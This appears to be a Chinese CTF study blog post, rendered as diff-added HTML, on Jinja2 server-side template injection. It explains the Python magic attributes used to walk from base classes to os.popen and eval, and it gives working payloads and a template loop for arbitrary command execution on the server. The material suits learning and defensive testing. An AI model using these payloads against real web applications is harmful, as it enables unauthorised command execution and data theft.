+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs crystal">控制结构<span class="hljs-template-variable">&#123;% %&#125;</span><br>变量取值<span class="hljs-template-variable">&#123;&#123; &#125;&#125;</span><br>注释&#123;<span class="hljs-comment"># #&#125;</span><br><br><span class="hljs-template-variable">&#123;&#123;&#125;&#125;</span>语法表示一个变量，它是一种特殊的占位符。当用jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，jinja2支持python中所有的Python数据类型比如列表、字段、对象等。<br><br><span class="hljs-template-variable">&#123;&#123;&#125;&#125;</span>内的内容，Jinja2渲染时不只进行填充和替换，还能够执行部分表达式。<br></code></pre></td></tr></table></figure>
+
+<h4 id="Python中常用于ssti的魔术方法"><a href="#Python中常用于ssti的魔术方法" class="headerlink" title="Python中常用于ssti的魔术方法"></a>Python中常用于ssti的魔术方法</h4><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">config：查看配置信息<br><span class="hljs-emphasis">__class__</span>：返回类型所属的对象<br><span class="hljs-emphasis">__mro__</span>：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。<br><span class="hljs-emphasis">__base__</span>：返回该对象所继承的基类// <span class="hljs-emphasis">__base__</span>和<span class="hljs-emphasis">__mro__</span>都是用来寻找基类的<br><span class="hljs-emphasis">__subclasses__</span>：每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表<br><span class="hljs-emphasis">__init__</span>：类的初始化方法<br><span class="hljs-emphasis">__globals__</span>：对包含函数全局变量的字典的引用<br><span class="hljs-emphasis">__builtins__</span>：builtins即是引用，Python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于builtins却不用导入，它在任何模块都直接可见，所以可以直接调用引用的模块<br></code></pre></td></tr></table></figure>
+
+<h4 id="ssti的一般流程："><a href="#ssti的一般流程：" class="headerlink" title="ssti的一般流程："></a>ssti的一般流程：</h4><p>获取基本类-&gt;获取基本类的子类-&gt;在子类中找到关于命令执行和文件读写的模块-&gt;使用其中的函数</p>
+<h5 id="获取基类"><a href="#获取基类" class="headerlink" title="获取基类"></a>获取基类</h5><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sqf">[].<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span><br>[].<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>]	  <span class="hljs-comment">//查看第一个基类</span><br>().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span><br>&#123;&#125;.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>   <br><span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span><br><span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>]       <span class="hljs-comment">//查看第三个基类</span><br><br></code></pre></td></tr></table></figure>
+
+<h5 id="获取基本类的子类"><a href="#获取基本类的子类" class="headerlink" title="获取基本类的子类"></a>获取基本类的子类</h5><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">[].<span class="hljs-emphasis">__class__</span>.<span class="hljs-emphasis">__base__</span>.<span class="hljs-emphasis">__subclasses__</span>()<br></code></pre></td></tr></table></figure>
+
+<h5 id="调用基本类的子类"><a href="#调用基本类的子类" class="headerlink" title="调用基本类的子类"></a>调用基本类的子类</h5><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>()[类的号]<br></code></pre></td></tr></table></figure>
+
+<h4 id="四种方法读取内容"><a href="#四种方法读取内容" class="headerlink" title="四种方法读取内容"></a>四种方法读取内容</h4><h5 id="site-Printer类调用os-popen函数执行任意命令"><a href="#site-Printer类调用os-popen函数执行任意命令" class="headerlink" title="site._Printer类调用os.popen函数执行任意命令"></a>site._Printer类调用os.popen函数执行任意命令</h5><p>要找到os模块的位置，他是位于&lt;class ‘site._Printer’&gt;里面 ，结果查找在第71个类。<br>之后通过</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[]</span>.__class__.__mro__<span class="hljs-selector-attr">[2]</span>.<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[71]</span>.__init__.__globals__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;os&#x27;</span>]</span><span class="hljs-selector-class">.popen</span>(<span class="hljs-string">&#x27;命令行语句&#x27;</span>)<span class="hljs-selector-class">.read</span>()<br></code></pre></td></tr></table></figure>
+
+<p>来调用服务器的控制台并显示。</p>
+<h5 id="site-Printer类调用os-listdir函数执行查看本级目录下的文件"><a href="#site-Printer类调用os-listdir函数执行查看本级目录下的文件" class="headerlink" title="site._Printer类调用os.listdir函数执行查看本级目录下的文件"></a>site._Printer类调用os.listdir函数执行查看本级目录下的文件</h5><p><code>.__init__.__globals__[&#39;os&#39;].listdir(&#39;.&#39;)</code>函数也可以读取本级目录下的文件：</p>
+<h5 id="catch-warnings类的linecache函数执行任意命令"><a href="#catch-warnings类的linecache函数执行任意命令" class="headerlink" title="catch_warnings类的linecache函数执行任意命令"></a>catch_warnings类的linecache函数执行任意命令</h5><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">[].<span class="hljs-emphasis">__class__</span>.<span class="hljs-emphasis">__base__</span>.<span class="hljs-emphasis">__subclasses__</span>()<br></code></pre></td></tr></table></figure>
+
+<p>在所有模块中查找catch_warnings类的位置：</p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">[].<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">59</span>].<span class="hljs-variable">__init__</span>.func_globals.<span class="hljs-built_in">keys</span>()<br></code></pre></td></tr></table></figure>
+
+<p>后查看catch_warnings类都存在哪些全局函数，可以找到linecache函数，os模块就在其中</p>
+<p>后<code>linecache</code>函数通过调用<code>eval</code>函数执行<code>__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()</code>命令即可实现任意命令执行。</p>
+<h5 id="遍历基类找函数执行-import-“os”-popen-“ls”-read-命令"><a href="#遍历基类找函数执行-import-“os”-popen-“ls”-read-命令" class="headerlink" title="遍历基类找函数执行__import __(“os”).popen(“ls”).read()命令"></a>遍历基类找函数执行<code>__import __(“os”).popen(“ls”).read()</code>命令</h5><p>直接通过循环遍历逐层找到<code>catch_warnings</code>类，然后找到<code>linecache</code>函数，之后调用<code>eval</code>函数执行<code>(&#39;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#39;)</code>，可以自动寻找相应函数实现任意命令执行</p>
+<figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="language-xml">//在所有继承的基类中</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><span class="language-xml">  //先找到catch_warnings类</span><br><span class="language-xml">  </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> b <span class="hljs-keyword">in</span> c.__init__.__globals__.values() %&#125;</span><span class="language-xml">//在所有catch_warnings类的全局变量函数的字典的引用中  </span><br><span class="language-xml">  </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><span class="language-xml">//某个函数的字典的引用的所属类和当前对象所属类相同</span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> &#x27;eval&#x27; <span class="hljs-keyword">in</span> b.keys() %&#125;</span><span class="language-xml">    //找到eval函数</span><br><span class="language-xml">      </span><span class="hljs-template-variable">&#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;) &#125;&#125;</span><span class="language-xml">  //导入cmd 执行popen里的命令 read读出数据</span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml">  </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml">  </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/web%E6%80%BB%E7%BB%93/" class="category-chain-item">web总结</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href=" ">#web</a>
+      
+        <a href=" ">#总结</a>
+      
+    </div>
+  
+</div>
+
+
+              
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/01/19/pwn-%E7%AC%AC%E4%BA%8C%E5%91%A8/" title="pwn-第二周">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">pwn-第二周</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/01/13/web-%E7%AC%AC%E4%B8%80%E5%91%A8/" title="web-第一周">
+                        <span class="hidden-mobile">web-第一周</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+      
+
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
